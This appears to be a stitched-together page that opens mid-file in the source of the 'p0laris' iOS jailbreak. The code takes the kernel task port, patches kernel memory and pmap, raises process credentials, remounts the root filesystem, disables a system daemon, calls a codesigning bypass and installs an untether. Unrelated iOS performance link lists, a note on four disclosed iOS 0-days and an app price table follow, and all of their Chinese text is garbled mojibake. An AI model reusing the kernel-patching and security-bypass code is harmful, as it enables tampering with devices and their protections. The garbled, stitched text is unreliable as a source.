	 *  nuke timed
	 */
	run_cmd("mv /System/Library/LaunchDaemons/com.apple.timed.plist /System/Library/LaunchDaemons/com.apple.timed.plist_");
	
	/*
	 *  0wn codesigning
	 */
	_0wn();
	
	/*
	 *  taunting...
	 */
	lprintf("[*] game over, codesigning. would you like to try again?");
#endif
	
	lprintf("[*] untether should be haxd on now");
	
	/*
	 *  sync, if we're already jailbroken
	 *  and the untether is now triggering,
	 *  we might panic to all hell and back
	 */
	sync();
	sync();
	sync();
	sync();
	sync();
	
	/* todo */
	
	return ret;
}
#else
#error This isn't enabled anymore, censored for public release: the mount bug was chosen. Nice job being curious, though! :)
#endif
#endif

bool extract_bootstrap(void) {
	bool re_extracting = false;
	bool ret = true;
	
	if (exists("/.p0laris") || exists("/.installed_home_depot")) {
		re_extracting = true;
		lprintf("k? guess we're re-extracting then. your choice, i guess? ...");
	}
	
	progress_ui("getting bundle paths");
	char* tar_path = bundle_path("tar");
	char* launchctl_path = bundle_path("launchctl");
	char* cydia_path = bundle_path("Cydia-9.0r4-Raw.tar");
	
	chmod(tar_path, 0777);
	
	/*
	 *  extract bootstrap
	 */
	progress_ui("extracting, this might take a while");
	chmod(tar_path, 0777);
	char* argv_[] = {tar_path, "-xf", cydia_path, "-C", "/", "--preserve-permissions", NULL};
	easy_spawn(tar_path, argv_);
	
	/*
	 *  touch cydia_no_stash (disable stashing, not included yet)
	 */
	progress_ui("disabling stashing");
	run_cmd("/bin/touch /.cydia_no_stash");
	
	/*
	 *  copy tar
	 */
	progress_ui("copying tar");
	run_cmd("/bin/cp -p %s /bin/tar", tar_path);
	
	/*
	 *  copy launchctl
	 */
	progress_ui("copying launchctl");
	run_cmd("/bin/cp -p %s /bin/launchctl", launchctl_path);
	
	/*
	 *  make them exectuable
	 */
	chmod("/bin/tar", 0755);
	chmod("/bin/launchctl", 0755);
	
	/*
	 *  i don't remember where this is from, Home Depot / Phoenix?
	 */
	chmod("/private", 0755);
	chmod("/private/var", 0755);
	chmod("/private/var/mobile", 0711);
	chmod("/private/var/mobile/Library", 0711);
	chmod("/private/var/mobile/Library/Preferences", 0755);
	
	mkdir("/Library/LaunchDaemons", 0777);
	
#if INSTALL_UNTETHER
	progress_ui("installing untether");
	install_untether();
	progress_ui("installed untether");
#endif
	
	if (!exists("/.p0laris")) {
		FILE* fp = fopen("/.p0laris", "w");
		fprintf(fp, "please don't delete this, the sky will fall and stuff or something\n"
				"  - p0laris, with love from spv.\n");
		fclose(fp);
	}
	
	sync();
	sync();
	sync();
	sync();
	sync();
	
	return ret;
}

#if DO_CSBYPASS
/*
 *  codesigning exploit is unfinished
 */
bool csbypass_wrapper(void) {
	bool ret = true;
	
	bool _0wnd = _0wn();
	lprintf("codesigning 0wnd: %s", _0wnd ? "true" : "false");
	
	sync();
	sync();
	sync();
	sync();
	sync();
	
#if 0
	uint32_t* comm_page_time = (uint32_t*)0xffff4048;
	while (*comm_page_time < 1000000000) {
		usleep(100000);
	}
	//	sleep(2);
#endif
	
	return ret;
}
#endif

bool post_jailbreak(void) {
	bool need_uicache = false;
	bool ret = true;
	
	if (global_untethered) {
		run_cmd("/usr/sbin/BTServer_");
#if DO_CSBYPASS
		csbypass_wrapper();
#endif
	}
	
	progress_ui("remounting /");
	char* nmr = strdup("/dev/disk0s1s1");
	int mntr = mount("hfs", "/", 0x10000, &nmr);
	lprintf("mount(...); = %d\n", mntr);
	
#if !FIRST_TIME_OVERRIDE
	if (!exists("/.p0laris") && !exists("/.installed_home_depot")) {
#endif
		progress_ui("extracting bootstrap");
		extract_bootstrap();
		need_uicache = true;
#if !FIRST_TIME_OVERRIDE
	}
#endif
	
#if INSTALL_UNTETHER
	if (!exists("/untether/p0laris")) {
		if (exists("/untether")) {
			progress_ui("fixing untether");
		} else {
			progress_ui("installing untether");
		}
		install_untether();
	}
#endif
	
	/*
	 *  doubleH3lix
	 */
	progress_ui("fixing springboard");
	NSMutableDictionary *md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
	
	[md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
	
	[md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
	
	progress_ui("restarting cfprefsd");
	run_cmd("/usr/bin/killall -9 cfprefsd &");
	
#if !FIRST_TIME_OVERRIDE
	if (need_uicache) {
#endif
		progress_ui("running uicache");
		run_cmd("su -c uicache mobile &");
#if !FIRST_TIME_OVERRIDE
	}
#endif
	
	progress_ui("loading launch daemons");
	run_cmd("/bin/launchctl load /Library/LaunchDaemons/*");
	run_cmd("/etc/rc.d/*");
	
	progress_ui("respringing");
	run_cmd("(killall -9 backboardd) &");
	
	if (!global_untethered) {
#if DO_CSBYPASS
		csbypass_wrapper();
#endif
	}
	
	return ret;
}

#define DUMP_LENGTH (32 * 1024 * 1024)

bool jailbreak(void) {
#if DUMP_KERNEL
	NSString *ns_doc_dir	= NULL;
#endif
	
	uint32_t before		 = -1;
	uint32_t after		  = -1;
	
#if DUMP_KERNEL
	NSArray *paths		  = NULL;
#endif
	
#if DUMP_KERNEL
	char* open_this		 = NULL;
	char* doc_dir		   = NULL;
	char* dump			  = NULL;
#endif
	
	bool ret				= false;
	
	progress_ui("exploiting kernel");
	
	tfp0 = get_kernel_task();
	
	lprintf("I live in a constant state of fear and misery");
	lprintf("Do you miss me anymore?");
	lprintf("And I don't even notice when it hurts anymore");
	lprintf("Anymore, anymore, anymore");
	
	progress_ui("exploited kernel");
	
	kernel_base = kbase();
	kaslr_slide = kernel_base - UNSLID_BASE;
	
#if DUMP_KERNEL
	dump = malloc(DUMP_LENGTH);
	
	dump_kernel(dump, DUMP_LENGTH);
	
	paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
												NSUserDomainMask,
												YES);
	ns_doc_dir = [paths firstObject];
	doc_dir = (char*)[ns_doc_dir UTF8String];
	asprintf(&open_this,
			 "%s/kernel_dump-%ld-0x%08x.bin",
			 doc_dir,
			 time(NULL),
			 kaslr_slide);
	
	FILE *f = fopen(open_this, "w");
	fwrite(dump,
		   1,
		   (32 * 1024 * 1024),
		   f);
	fclose(f);
	
	zfree(&dump);
	
	goto done;
#endif
	
#if ENABLE_DEBUG
	progress("got tfp0! tfp0=0x%x, kernel_base=0x%08x, kaslr_slide=0x%08x",
			 tfp0,
			 kernel_base,
			 kaslr_slide);
#endif
	
	progress_ui("patching pmap");
	patch_kernel_pmap();
	progress("patched pmap");
	
	progress_ui("checking pmap patch");
	
	before	= kread_uint32(kernel_base);
	kwrite_uint32(kernel_base, 0x41424344);
	after	= kread_uint32(kernel_base);
	kwrite_uint32(kernel_base, before);
	
#if ENABLE_DEBUG
	progress("kbase before: 0x%x, kbase after: 0x%x",
			 before,
			 after);
#endif
	
	/*
	 *  i commented out "before == 0xfeedface" as at times,
	 *  i will test kernel patches and/or other functionality
	 *  on an already jailbroken device, and don't feel like rebooting.
	 *  also so that you can re-install the untether without rebooting
	 *  after installing the application :P
	 */
	
	if (before != after && /* before == 0xfeedface && */ after == 0x41424344) {
		progress_ui("pmap patched!");
	} else {
		progress_ui("pmap patch failed");
		goto done;
	}
	
	progress_ui("cleaning up the kernel");
	exploit_cleanup(tfp0);
	
	progress_ui("patching kernel");
	if (!patch_kernel())
		goto done;
	progress_ui("patched kernel");
	
	progress_ui("doing post jailbreak work");
	post_jailbreak();
	
	/*
	 *  note: todo: save original uid in case unsandboxed root daemon
	 */
	
	kwrite_uint32(myproc + 0xa4, ourcred);
	setuid(501);
	
#if BTSERVER_USED
	if (global_untethered)
		run_cmd("launchctl bsexec .. /bin/sh -c \"(while true; do /usr/sbin/BTServer_; done) &\"");
#endif
	
#if UNPATCH_PMAP
	progress("unpatching pmap");
	pmap_unpatch();
	progress("unpatched pmap");
#endif
	
	ret = true;
	
	zfree(&offsets);
	
	syslog(LOG_SYSLOG, "we out here");
	
done:
	progress_ui("cleaning up");
	exploit_cleanup(tfp0);
	
	return ret;
}

bool _jailbreak(void) {
	return jailbreak();
}

```

## å¥¥å¾·èµ›Odyssey iOS13.5.1-13.7è¶Šç‹±å·¥å…·
#### https://theodyssey.dev/

## iOS æ€§èƒ½ä¼˜åŒ–æ¢³ç†ï¼š
### åŸºæœ¬å·¥å…·ã€ä¸šåŠ¡ä¼˜åŒ–ã€å†…å­˜ä¼˜åŒ–ã€å¡é¡¿ä¼˜åŒ–ã€å¸ƒå±€ä¼˜åŒ–ã€ç”µé‡ä¼˜åŒ–ã€ å®‰è£…åŒ…ç˜¦èº«ã€å¯åŠ¨ä¼˜åŒ–ã€ç½‘ç»œä¼˜åŒ–ç­‰

#### iOS å®˜æ–¹æ–‡æ¡£
* [Performance ä¸“é¢˜](https://developer.apple.com/library/content/navigation/#section=Topics&topic=Performance) 
* [Core Animation Programming Guide](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreAnimation_guide) 


#### iOS æ€§èƒ½ä¼˜åŒ–ç›¸å…³ä¹¦ç±
* [Pro iOS Apps Performance Optimization](http://download.csdn.net/detail/tskyming/9831453)
* [High Performance iOS Apps](http://download.csdn.net/detail/tskyming/9831465)
* [iOS-Core-Animation-Advanced-Techniques](https://github.com/AttackOnDobby/iOS-Core-Animation-Advanced-Techniques)

#### Instruments å·¥å…·ç›¸å…³
* [Instruments User Guide](https://developer.apple.com/library/content/documentation/DeveloperTools/Conceptual/InstrumentsUserGuide/index.html) [ä¸­æ–‡ç¿»è¯‘-PDF](http://cdn.cocimg.com/bbs/attachment/Fid_6/6_24457_90eabb4ed5b3863.pdf) 
* [Instrumentsä¹‹Leakså­¦ä¹ ](http://www.cnblogs.com/lxlx1798/p/6933485.html) 
* [Instrumentså­¦ä¹ ä¹‹Allocations](http://www.cnblogs.com/lxlx1798/p/6933195.html) 
* [instrumentä¹‹Time Profileræ€»ç»“](http://www.cnblogs.com/lxlx1798/p/6933604.html)
* [Instrumentså­¦ä¹ ä¹‹Core Animationå­¦ä¹ ](http://www.cnblogs.com/lxlx1798/p/6933364.html) 
* [Instrumentsä¹‹Activity Monitorä½¿ç”¨å…¥é—¨](http://www.cnblogs.com/lxlx1798/p/6933141.html) 

#### GMTC-2018 PPT
* [LinkedInç§»åŠ¨åº”ç”¨çš„æ€§èƒ½ä¼˜åŒ–ä¹‹é“](https://ppt.geekbang.org/slide/show?cid=31&pid=1495)
* [ç¾å›¢å®¢æˆ·ç«¯ç›‘æ§ä¸å¼‚å¸¸æ’æŸ¥å®è·µ](https://ppt.geekbang.org/slide/show?cid=31&pid=1500)
* [çˆ±å¥‡è‰ºAPPæè‡´ä½“éªŒä¹‹è·¯](https://ppt.geekbang.org/slide/show?cid=31&pid=1497)
* [å¤§å‰ç«¯æ—¶ä»£å‰ç«¯ç›‘æ§çš„æœ€ä½³å®è·µ](https://ppt.geekbang.org/slide/show?cid=31&pid=1496)
* [æ€§èƒ½ä¼˜åŒ–ä¸ç›‘æ§ä¸“é¢˜PPT](https://gmtc.infoq.cn/2019/beijing/)

#### ç»¼åˆç¯‡
* [WWDC2012-235-iOS APP Performance:Responsiveness](https://developer.apple.com/videos/play/wwdc2012/235)
* [å¾®ä¿¡è¯»ä¹¦iOSæ€§èƒ½ä¼˜åŒ–](http://wereadteam.github.io/2016/05/03/WeRead-Performance/)
* [å¾®ä¿¡è¯»ä¹¦ iOS è´¨é‡ä¿è¯åŠæ€§èƒ½ç›‘æ§](http://wereadteam.github.io/2016/12/12/Monitor/)
* [æ·±å…¥å‰–æ iOS æ€§èƒ½ä¼˜åŒ–](https://ming1016.github.io/2017/06/20/deeply-ios-performance-optimization/)
* [é­”çª—ç ”å‘å‰¯æ€»è£æ²ˆå“²ï¼šç§»åŠ¨ç«¯SDKçš„ä¼˜åŒ–ä¹‹è·¯](http://blog.csdn.net/magicwindow/article/details/51423463)
* [æœç‹—è¾“å…¥æ³• iOS ç‰ˆå¼€å‘ä¸ä¼˜åŒ–å®è·µ](http://www.cocoachina.com/design/20160905/17483.html)[PPT](https://github.com/MDCC2016/iOS-Session-Slides/blob/master/%E6%90%9C%E7%8B%97%E8%BE%93%E5%85%A5%E6%B3%95%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E5%AE%9E%E8%B7%B5-%E6%9D%8E%E8%85%BE%E6%9D%B0.pdf)
* [è˜‘è‡è¡— App çš„ç¨³å®šæ€§ä¸æ€§èƒ½å®è·µ](http://www.infoq.com/cn/presentations/stability-and-performance-of-mogujie-app)[PPT](https://sanwen8.cn/p/6e5c888.html)
* [â¼¿æ·˜iOSæ€§èƒ½ä¼˜åŒ–æ¢ç´¢](http://pstatic.geekbang.org/pdf/593a53d813cef.pdf?e=1497499485&token=eHNJKRTldoRsUX0uCP9M3icEhpbyh3VF9Nrk5UPM:sa-xp_aIeIhtiWbqR-hY4ImMzFc=)
* [iOS App ç¨³å®šæ€§æŒ‡æ ‡åŠç›‘æµ‹](https://juejin.im/post/58ca0832a22b9d006418fe43)

#### å†…å­˜ä¼˜åŒ–
* [Memory Usage Performance Guidelines](https://developer.apple.com/library/content/documentation/Performance/Conceptual/ManagingMemory/ManagingMemory.html#//apple_ref/doc/uid/10000160i) 
* [WWDC-2018-416](https://developer.apple.com/videos/play/wwdc2018/416/)[ä¸­æ–‡ç¿»è¯‘](https://juejin.im/post/5b23dafee51d4558e03cbf4f)
* [æ¢ç´¢iOSå†…å­˜åˆ†é…](https://juejin.im/post/5a5e13c45188257327399e19) 
* [iOSå¾®ä¿¡å†…å­˜ç›‘æ§](http://wetest.qq.com/lab/view/367.html?from=content_juejin)
* [å†…å­˜ç®¡ç†åŠä¼˜åŒ–(ä¸Š)-QQæµè§ˆå™¨](https://www.imooc.com/video/11075)
* [å†…å­˜ç®¡ç†åŠä¼˜åŒ–(ä¸‹)-QQæµè§ˆå™¨](https://www.imooc.com/video/11076)
* [OOMæ¢ç©¶ï¼šXNU å†…å­˜çŠ¶æ€ç®¡ç†](https://www.jianshu.com/p/4458700a8ba8)

#### å¡é¡¿ä¼˜åŒ–
* [UIKitæ€§èƒ½è°ƒä¼˜å®æˆ˜è®²è§£](http://www.cocoachina.com/ios/20160208/15238.html?utm_source=tuicool&utm_medium=referral)
* [QQç©ºé—´æ‰å¸§ç‡ä¼˜åŒ–å®æˆ˜](http://wetest.qq.com/lab/view/354.html)
* [å®ç° 60fps çš„ç½‘æ˜“äº‘éŸ³ä¹é¦–é¡µ](https://mp.weixin.qq.com/s?__biz=MzA4MzEwOTkyMQ==&mid=2667379069&idx=1&sn=376d9ef2261cf13e930406f1c35d3569) 
* [iOS ä¿æŒç•Œé¢æµç•…çš„æŠ€å·§](http://blog.ibireme.com/2015/11/12/smooth_user_interfaces_for_ios/)
* [iOS UIæ€§èƒ½ä¼˜åŒ–æ€»ç»“](http://www.cocoachina.com/ios/20180412/22990.html)
* [å¾®ä¿¡iOSå¡é¡¿ç›‘æ§ç³»ç»Ÿ](http://mp.weixin.qq.com/s?__biz=MzAwNDY1ODY2OQ%3D%3D&idx=1&mid=207890859&scene=23&sn=e98dd604cdb854e7a5808d2072c29162&srcid=0921FzoCw9j1W7n4uFYKuarC#rd)
* [iOS-å¡é¡¿æ£€æµ‹](http://www.cnblogs.com/gatsbywang/p/5555200.html)
* [iOSç›‘æ§ï¼šå¡é¡¿æ£€æµ‹](http://ios.jobbole.com/93085/)
* [iOSåº”ç”¨UIçº¿ç¨‹å¡é¡¿ç›‘æ§](https://mp.weixin.qq.com/s?__biz=MzI5MjEzNzA1MA==&mid=2650264136&idx=1&sn=052c1db8131d4bed8458b98e1ec0d5b0&chksm=f406837dc3710a6b49e76ce3639f671373b553e8a91b544e82bb8747e9adc7985fea1093a394#rd)

#### å¸ƒå±€ä¼˜åŒ–
TODOï¼š

#### ç”µé‡ä¼˜åŒ– 
* [Guide - Energy Efficiency Guide for iOS Apps](https://developer.apple.com/library/content/documentation/Performance/Conceptual/EnergyGuide-iOS/index.html#//apple_ref/doc/uid/TP40015243)
* [WWDC2017 - Writing Energy Efficient Apps](https://developer.apple.com/videos/play/wwdc2017/238/)
* [iOS å¸¸è§è€—ç”µé‡æ£€æµ‹æ–¹æ¡ˆè°ƒç ”](https://github.com/ChenYilong/iOSBlog/issues/10)
* [æ•™ä½ å¼€å‘çœç”µçš„ iOS appï¼ˆWWDC17 è§‚åï¼‰](http://www.jianshu.com/p/f0dc653d04ca)
* [æµ…æç§»åŠ¨èœ‚çªç½‘ç»œçš„ç‰¹ç‚¹åŠå…¶çœç”µæ–¹æ¡ˆ](https://juejin.im/post/5a0c5af051882578da0d6925)
* [iOSç”µé‡æµ‹è¯•å®è·µ](https://mp.weixin.qq.com/s/q39BHIWsbdNeqfH85EOkIQ)
* [iOSè¿›é˜¶--AppåŠŸè€—ä¼˜åŒ–çœ‹è¿™ç¯‡å°±å¤Ÿäº†](http://www.cocoachina.com/ios/20171204/21413.html)

#### å¯åŠ¨ä¼˜åŒ–
* [WWDC2016-406-Optimizing App Startup Time](https://developer.apple.com/videos/play/wwdc2016/406)
* [WWDC2017-413-App Startup Time:Past,Present,and Future](https://developer.apple.com/videos/play/wwdc2017/413)
* [å¦‚ä½•ç²¾å‡†åº¦é‡iOSAPPå¯åŠ¨æ—¶é—´](https://www.jianshu.com/p/c14987eee107)
* [ä¼˜åŒ– App çš„å¯åŠ¨æ—¶é—´-æ¨è§ç‰](http://yulingtianxia.com/blog/2016/10/30/Optimizing-App-Startup-Time)
* [iOSå®¢æˆ·ç«¯å¯åŠ¨é€Ÿåº¦ä¼˜åŒ–-ä»Šæ—¥å¤´æ¡](https://techblog.toutiao.com/2017/01/17/iosspeed/#more)
* [iOS App å¯åŠ¨æ€§èƒ½ä¼˜åŒ–-WiFiç®¡å®¶](https://mp.weixin.qq.com/s/Kf3EbDIUuf0aWVT-UCEmbA)
* [iOS Appå¦‚ä½•ä¼˜åŒ–å¯åŠ¨æ—¶é—´-Facebook](http://www.cocoachina.com/ios/20160104/14870.html)
* [iOS å¯åŠ¨é€Ÿåº¦ä¼˜åŒ–-ç™¾åº¦è¾“å…¥æ³•](http://www.infoq.com/cn/presentations/ios-typewriting-start-speed-optimization)
* [objä¸­å›½-Mach-O å¯æ‰§è¡Œæ–‡ä»¶](https://objccn.io/issue-6-3/)
* [iOS appå¯åŠ¨é€Ÿåº¦ç ”ç©¶å®è·µ](https://zhuanlan.zhihu.com/p/38183046?from=1086193010&wm=3333_2001&weiboauthoruid=1690182120)
* [iOS Appå†·å¯åŠ¨æ²»ç†ï¼šæ¥è‡ªç¾å›¢å¤–å–çš„å®è·µ](https://mp.weixin.qq.com/s/jN3jaNrvXczZoYIRCWZs7w)
* [è„‰è„‰iOSå¦‚ä½•å¯åŠ¨ç§’å¼€](https://zhuanlan.zhihu.com/p/396550853)

#### ä½“ç§¯ä¼˜åŒ–
* [iOSå¾®ä¿¡å®‰è£…åŒ…ç˜¦èº«](http://mp.weixin.qq.com/s?__biz=MzAwNDY1ODY2OQ==&mid=207986417&idx=1&sn=77ea7d8e4f8ab7b59111e78c86ccfe66&scene=24&srcid=0921TTAXHGHWKqckEHTvGzoA#rd)
* [ä»Šæ—¥å¤´æ¡IPAå®‰è£…åŒ…çš„ä¼˜åŒ–](https://techblog.toutiao.com/2016/12/27/iphone/)
* [iOSç˜¦èº«ä¹‹åˆ é™¤FrameWorkä¸­æ— ç”¨mach-Oæ–‡ä»¶](http://www.infoq.com/cn/articles/ios-thinning-delete-unnecessary-mach-o)
* [åŸºäºclangæ’ä»¶çš„ä¸€ç§iOSåŒ…å¤§å°ç˜¦èº«æ–¹æ¡ˆ](http://www.infoq.com/cn/articles/clang-plugin-ios-app-size-reducing)
* [iOSå¯æ‰§è¡Œæ–‡ä»¶ç˜¦èº«æ–¹æ³•](http://blog.cnbang.net/tech/2544/)
* [iOSå›¾ç‰‡ä¼˜åŒ–æ–¹æ¡ˆ](http://crespoxiao.github.io/2016/11/12/iOS%E5%9B%BE%E7%89%87%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/)
* [æ»´æ»´å‡ºè¡Œ iOS ç«¯ç˜¦èº«å®è·µçš„ Slides](https://ming1016.github.io/2017/06/12/gmtc-ios-slimming-practice/)

#### ç½‘ç»œä¼˜åŒ–
* [ç¾å›¢ç‚¹è¯„ç§»åŠ¨ç½‘ç»œä¼˜åŒ–å®è·µ](http://tech.meituan.com/SharkSDK.html)
* [å¼€æºç‰ˆHttpDNSæ–¹æ¡ˆè¯¦è§£](http://mp.weixin.qq.com/s?__biz=MzAwMDU1MTE1OQ==&mid=209805123&idx=1&sn=ced8d67c3e2cc3ca38ef722949fa21f8)
* [æºç¨‹Appçš„ç½‘ç»œæ€§èƒ½ä¼˜åŒ–å®è·µ](http://www.infoq.com/cn/articles/how-ctrip-improves-app-networking-performance)
* [2016å¹´æºç¨‹Appç½‘ç»œæœåŠ¡é€šé“æ²»ç†å’Œæ€§èƒ½ä¼˜åŒ–å®è·µ](http://www.infoq.com/cn/articles/app-network-service-and-performance-optimization-of-ctrip)
* [è˜‘è‡è¡—App Chromiumç½‘ç»œæ ˆå®è·µ](http://www.infoq.com/cn/articles/mogujie-app-chromium-network-layer)
* [è˜‘è‡è¡—é«˜å¹¶å‘å¤šç»ˆç«¯æ— çº¿ç½‘å…³å®è·µ](http://www.infoq.com/cn/presentations/mogujie-high-concurrent-multi-terminal-wireless-gateway-practice)
* [ç§»åŠ¨ APP ç½‘ç»œä¼˜åŒ–æ¦‚è¿°](http://blog.cnbang.net/tech/3531/?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io)
 
#### ç¼–è¯‘ä¼˜åŒ–
* [Optimizing-Swift-Build-Times](https://github.com/fastred/Optimizing-Swift-Build-Times)

#### APM 
* [ç§»åŠ¨ç«¯ç›‘æ§ä½“ç³»ä¹‹æŠ€æœ¯åŸç†å‰–æ](http://ios.jobbole.com/92988/)
* [ç½‘æ˜“ - NeteaseAPM iOS SDKæŠ€æœ¯å®ç°åˆ†äº«](http://mp.weixin.qq.com/s?__biz=MzA3ODg4MDk0Ng==&mid=2651112215&idx=1&sn=9cc5b5fa630542a6d4b7a5626e35217a#rd)
* [ç½‘æ˜“ä¹å¾— - iOSæ— åŸ‹ç‚¹æ•°æ®SDKå®è·µä¹‹è·¯](http://www.jianshu.com/p/69ce01e15042) 
* [å¬äº‘ - ç§»åŠ¨ç«¯ APM äº§å“ç ”å‘æŠ€èƒ½](http://www.infoq.com/cn/presentations/mobile-terminal-apm-product-development-skills) 
* [å¬äº‘ - ç§»åŠ¨ App æ€§èƒ½ç›‘æµ‹](http://www.infoq.com/cn/presentations/mobile-app-performance-monitoring-practice?utm_source=presentations_about_mobile&utm_medium=link&utm_campaign=mobile)
* [iOS æ€§èƒ½ç›‘æ§ SDK â€”â€” Wedjatï¼ˆåç‹„ç‰¹ï¼‰å¼€å‘è¿‡ç¨‹çš„è°ƒç ”å’Œæ•´ç†](https://github.com/aozhimin/iOS-Monitor-Platform)
* [æ­ç§˜ APM iOS SDK çš„æ ¸å¿ƒæŠ€æœ¯](https://github.com/iOS-APM/iOS-APM-Secrets)  
* [iOS-Monitor-Resources](https://github.com/aozhimin/iOS-Monitor-Resources) 
* [iOS æµé‡ç›‘æ§åˆ†æ](https://juejin.im/post/5b1602906fb9a01e3542f08c)
* [å°è¯•Xcodeé€†å‘ï¼šappå†…å­˜ç›‘æ§åŸç†åˆæ¢](http://ddrccw.github.io/2017/12/30/reverse-xcode-with-lldb-and-hopper-disassembler)
* [APMCon-2016æ¼”è®²å®å½•](http://apmcon.cn/2016/index.html#yjsl)  
* [360ç§»åŠ¨ç«¯æ€§èƒ½ç›‘æ§å®è·µQDAS-APMï¼ˆiOSç¯‡ï¼‰](https://mp.weixin.qq.com/s/Vq0TDiLbexxBlqlf_lilnQ)  
* [ç§»åŠ¨ç«¯æ€§èƒ½ç›‘æ§æ–¹æ¡ˆHertz](https://tech.meituan.com/2016/12/19/hertz.html)

#### è°ƒè¯• & Crash
* [iOS é¡¹ç›®å¼€å‘è¿‡ç¨‹ä¸­ç”¨åˆ°çš„é«˜çº§è°ƒè¯•æŠ€å·§ï¼Œæ¶‰åŠä¸‰æ–¹åº“åŠ¨æ€è°ƒè¯•ã€é™æ€åˆ†æå’Œåç¼–è¯‘ç­‰é¢†åŸŸ](https://github.com/aozhimin/iOS-Debug-Hacks)
* [Understanding and Analyzing Application Crash Reports](https://developer.apple.com/library/content/technotes/tn2151/_index.html) 


#### ç›¸å…³å¼€æºåº“
##### ç½‘ç»œ
* [HTTPDNSLib-for-iOS](https://github.com/CNSRE/HTTPDNSLib-for-iOS)
* [HTTPDNSLib-for-Andorod](https://github.com/CNSRE/HTTPDNSLib)
* [NetworkEye](https://github.com/coderyi/NetworkEye/blob/master/README_Chinese.md) 

##### å†…å­˜
* [FBMemoryProfiler](https://github.com/facebook/FBMemoryProfiler)
* [iOS Memory Budget Test](https://github.com/Split82/iOSMemoryBudgetTest)

##### å¡é¡¿
* [PerformanceMonitor-Runloop](https://github.com/suifengqjn/PerformanceMonitor)
* [GYMonitor-FPS](https://github.com/featuretower/GYMonitor)

##### ç˜¦èº«
* [LSUnusedResources](https://github.com/tinymind/LSUnusedResources)
* [LinkMap](https://github.com/huanxsd/LinkMap)

#### APM
* [iOS-System-Services](https://github.com/iOS-APM/iOS-System-Services)
* [System Monitor](https://github.com/iOS-APM/SystemMonitor)
* [PerformanceTestingHelper](https://github.com/ArmsZhou/PerformanceTestingHelper)
* [GT](https://github.com/Tencent/GT) 
* [GodEye](https://github.com/zixun/GodEye)
* [ArgusAPM](https://github.com/Qihoo360/ArgusAPM)
* [AppleTrace](https://github.com/everettjf/AppleTrace)
* [matrix](https://github.com/Tencent/matrix)
* [MTHawkeye](https://github.com/meitu/MTHawkeye)


# -----------------------------------

## å…³äº4ä¸ª 0day iOS æ¼æ´

Denis Tokarev å‘è¡¨æ–‡ç« å…¬å¼€æŠ«éœ² 4 ä¸ª 0-day iOS æ¼æ´ï¼Œ

åæ§½è‹¹æœæ²¡æœ‰ç½²åæ„Ÿè°¢ï¼Œæœ€å…³é”®æ˜¯è‹¹æœæ²¡æœ‰ç»™èµé‡‘ï¼

ä½œè€…æ€’äº†, ä¸€å£æ°”å¼€æº4ä¸ªæ¼æ´  https://github.com/illusionofchaos/ios-nehelper-wifi-info-0day

ä»¥ä¸‹æ˜¯ä½œè€…æŠ«éœ²æ–‡ç« ï¼š

æ–‡ç« :  Disclosure of three 0-day iOS vulnerabilities and critique of Apple Security Bounty program / Ğ¥Ğ°Ğ±Ñ€
https://habr.com/ru/post/579714/

# -----------------------------------

äºŒã€äº‹ä»¶å§‹æœ«

ä» Twitter å¯çŸ¥ illusionofchaos ä¸ºåŒ–åçš„ç ”ç©¶äººå‘˜çœŸåæ˜¯ Denis Tokarevï¼ˆä¸¹å°¼æ–¯Â·æ‰˜å¡åˆ—å¤«ï¼‰ï¼Œ

ç›®å‰å…³äº Denis Tokarev ä¸ªäººèµ„æ–™å¹¶ä¸å¤šï¼Œé€šè¿‡å…¶ä½¿ç”¨ä¿„è¯­çš„ç½‘é¡µæŠ«éœ²æ¼æ´ï¼ŒçŒœæµ‹ä»–æ˜¯ä¿„ç½—æ–¯äººã€‚

ä½œè€…ç§°åœ¨ä»Šå¹´ 3 æœˆ 10 æ—¥ ~ 5 æœˆ 4 æ—¥ä¹‹é—´ç»™è‹¹æœæŠ¥å‘Šäº† 4 ä¸ª 0-day æ¼æ´ï¼Œ

åªåœ¨ iOS 14.7 ä¿®å¤äº†ä¸€ä¸ªï¼Œä½†è‹¹æœåœ¨iOS 14.7 å®‰å…¨æ€§å†…å®¹

æ›´æ–°é¡µé¢å¹¶æ²¡æœ‰æŠ«éœ²å‡ºæ¥ï¼å½“ä½œè€…å‘è‹¹æœ(Apple Product Security)æå‡ºè´¨ç–‘æ—¶ï¼Œä»–ä»¬æ‰¿è¯ºåœ¨ä¸‹ä¸€æ¬¡ç³»ç»Ÿç‰ˆæœ¬æ›´æ–°çš„é¡µé¢ä¸­åˆ—å‡ºï¼Œ

ä½†æ­¤åçš„ä¸‰æ¬¡ç‰ˆæœ¬å‘å¸ƒéƒ½æ²¡æœ‰åˆ—å‡ºã€‚æ‰€ä»¥ä½œè€…æ€’äº†ï¼å†³å®šæŠ«éœ²å‡ºæ¥ï¼

0-day æ¼æ´

0dayï¼Œzero-day vulnerabilityï¼Œ0-day vulnerabilityï¼Œé›¶æ—¥æ¼æ´æˆ–é›¶æ—¶å·®æ¼æ´ã€‚
# -----------------------------------

## `iOS`å¹³å°ä»˜è´¹è½¯ä»¶ç¯‡ (iOS)

è¯„åˆ†   | åç§°  | åŠŸèƒ½ç®€è¿° | å•ä»· | æµ‹è¯„
----- | ----- | ------ | ----- | -----
â˜…â˜…â˜…â˜…  | [Camera+] | æ›¿ä»£åŸç”Ÿæ‹ç…§è½¯ä»¶ | $1.99 | [#](http://iphone.appstorm.net/reviews/graphics/camera-4-an-almost-perfect-camera-app/)
â˜…â˜…â˜…â˜…  | [1Password] | å¯†ç ç®¡ç†&åŒæ­¥ | $17.99 | [#](http://mac.appstorm.net/reviews/security/1password-4-is-hands-down-the-best-password-app/)
â˜…â˜…â˜…â˜…  | [Tweetbot] | Twitter å®¢æˆ·ç«¯ | $2.99 | [#](http://www.macstories.net/reviews/tweetbot-3-review-human-after-all/)
â˜…â˜…â˜…â˜…  | [Weico Pro] | æ–°æµªå¾®åšç¬¬ä¸‰æ–¹å®¢æˆ·ç«¯ | ï¿¥6 | [#](http://sspai.com/24186)
